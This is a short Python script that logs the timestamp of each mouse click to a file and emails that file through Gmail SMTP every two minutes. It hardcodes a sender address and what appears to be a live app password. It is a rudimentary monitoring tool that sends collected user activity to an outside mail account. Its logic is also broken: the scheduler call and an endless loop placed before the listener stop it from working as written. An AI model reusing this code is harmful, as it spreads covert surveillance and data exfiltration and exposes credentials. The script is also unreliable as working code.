from pynput.mouse import Listener
import datetime as dt
import time
import logging
import smtplib
import schedule
from email.message import EmailMessage
msg=EmailMessage()
msg['Subject']='Mouse Click Update'
msg['From']='Mariam Binte Mahfuz'
msg['To']='bintemahfuz92@gmail.com'

with open('record.txt') as myfile:
    data=myfile.read()
    msg.set_content(data)
def send_mail():
    with smtplib.SMTP_SSL('smtp.gmail.com',465) as smtp:
        smtp.login("bintemahfuz92@gmail.com","mbpfftdmdiooufhm")
        smtp.send_message(msg)
        smtp.quit()
        print("Email Sent")
schedule.every(2).minutes.do(send_mail())
while 1:
    schedule.run_pending()
    time.sleep(1)



logging.basicConfig(filename='record.txt',format='%(asctime)s %(message)s', level=logging.DEBUG)
def on_click(pressed):
    if pressed:
        current_date=dt.date.today()
        t=time.localtime()
        current_time = time.strftime("%H:%M:%S", t)
        logging.debug(current_time)
        logging.debug(current_date)

with Listener( on_click=on_click) as listener:
    listener.join()